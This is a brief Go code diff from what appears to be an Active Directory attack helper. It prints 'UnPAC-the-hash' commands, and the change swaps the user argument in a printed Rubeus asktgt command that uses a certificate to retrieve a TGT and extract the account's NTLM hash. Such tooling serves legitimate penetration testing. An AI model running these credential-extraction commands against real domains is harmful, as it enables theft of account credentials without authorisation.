@@ -22,7 +22,7 @@ func PrintUnPACCommands(pfxPath, dc, domain, upn string) {
 	fmt.Println("    # Look for 'Got hash' in output")
 
 	fmt.Println("    # Rubeus (Windows — requests TGT + extracts credentials)")
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap\n", upn, pfxPath)
+	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap\n", user, pfxPath)
 	fmt.Println("    # Look for 'NTLM' hash in credential info")
 
 	fmt.Println("    # PKINITtools (Python)")
